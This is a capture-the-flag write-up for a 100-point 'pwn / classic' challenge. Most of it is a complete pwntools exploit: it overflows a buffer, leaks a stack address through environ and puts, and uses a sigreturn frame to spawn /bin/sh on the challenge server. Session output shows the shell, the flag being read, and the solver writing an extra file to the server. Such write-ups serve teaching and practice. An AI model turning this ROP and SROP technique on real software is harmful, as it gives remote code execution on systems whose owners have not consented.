# pwn / classic

> Points: 100

## Question

> A timeless classic.
>
> nc chall.uwc.tf 2005

### Provided Files

- [`main`](./main)

## Solution

Analyzing the binary, we find there is a buffer overflow vulnerability.
Obviously, the best way to solve this is to go complete overkill
and generate a shell somehow, and then `cat flag.txt`.

Since this will be a somewhat complicated ROP chain,
it's easier to just do this with `pwntools`.
One member of the team pulled some black magic out
(pictured below) and pulled it off:

```py
#!/usr/bin/env python3
from pwn import *
import sys

context.clear(arch="amd64", endian="little", os="linux")
p = remote("chall.uwc.tf", "2005")
# p = process("./main")
# gdb.attach(p.pid)

elf = ELF("./main")
rop = ROP(elf)

# symbols
SYM_ENVIRON = elf.symbols["environ"]
SYM_PUTS = elf.symbols["puts"]
SYM_MAIN = elf.symbols["main"]

# rop gadgets
OFFSET = b"A" * 264
POP_RAX = rop.find_gadget(["pop rax", "ret"])[0]
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
SYSCALL = rop.find_gadget(["syscall"])[0]

# leak stack offset with environ
chain = OFFSET + p64(POP_RDI) + p64(SYM_ENVIRON) + p64(SYM_PUTS) + p64(SYM_MAIN)
p.sendline(chain)
p.recvline() # read garbage
received = p.recvline().strip()
leak = u64(received.ljust(8, b"\x00"))
leak = leak - 320 + 32

magic = 272 # offset from rop chain to /bin/sh
cmd = b'/bin/sh\0'
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = leak + magic            # /bin/sh
frame.rsi = leak + magic + len(cmd) # argv
frame.rsp = leak                    # some stack space
frame.rip = SYSCALL

# perform exploit
chain = OFFSET + p64(POP_RAX) + p64(0xf) + p64(SYSCALL) + bytes(frame)
argv = p64(leak + magic) + p64(0)
p.sendline(chain + cmd + argv)
p.interactive()
```

We can now get the flag, in the easiest way possible.

```text
$ ./exploit.py
[+] Opening connection to chall.uwc.tf on port 2005: Done
[*] './main'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 122 cached gadgets for './main'
[*] Switching to interactive mode
/work # $ cat flag.txt
cat flag.txt
uwctf{classic_overflow_11922e1d1d2ed8f2}
/work # $ echo "uwctf{om3ga_was_here_lmao}" > best_flag_of_all_time.txt
echo "uwctf{om3ga_was_here_lmao}" > best_flag_of_all_time.txt
```

Now, where are those bonus points?

### Flag

`uwctf{classic_overflow_11922e1d1d2ed8f2}`
